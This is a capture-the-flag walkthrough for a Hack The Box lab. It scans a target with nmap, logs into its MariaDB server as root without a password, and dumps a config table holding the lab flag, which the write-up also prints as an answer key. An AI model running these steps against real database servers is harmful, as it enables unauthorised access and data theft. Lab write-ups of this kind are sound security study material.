# Appointment

## Machine Details 

- **CTF:** Hack The Box
- **Category:** Tier 1

## Solution

#### 1. During our scan, which port do we find serving MySQL?

```sh
$ nmap 10.129.189.115 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-02 12:46 CET
Nmap scan report for 10.129.189.115
Host is up (0.030s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 6.24 seconds
```

> 3306

#### 2. What community-developed MySQL version is the target running?

```sh
$ nmap -sC -p3306 10.129.189.115
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-02 12:48 CET
Nmap scan report for 10.129.189.115
Host is up (0.030s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 69
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, SupportsLoadDataLocal, InteractiveClient, IgnoreSigpipes, ConnectWithDatabase, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, LongColumnFlag, ODBCClient, SupportsTransactions, FoundRows, Speaks41ProtocolOld, SupportsCompression, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: Ne1d&,Ij[i~\4+yB~sGG
|_  Auth Plugin Name: mysql_native_password

Nmap done: 1 IP address (1 host up) scanned in 42.76 seconds
```

> MariaDB

#### 3. When using the MySQL command line client, what switch do we need to use in order to specify a login username?

> -u

#### 4. Which username allows us to log into this MariaDB instance without providing a password?

```sh
$ mysql -h 10.129.189.115 -u root
```

> root

#### 5. In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?

> *

#### 6. In SQL, what symbol do we need to end each query with?

> ;

#### 7. There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?

```sh
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0,03 sec)
```

> htb

#### Submit root flag

```sh
mysql> use htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0,03 sec)
mysql> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0,03 sec)
```


## Final Flag

> 7b4bec00d1a39e3dd4e021ec3d915da8

*Created by [bu19akov](https://github.com/bu19akov)*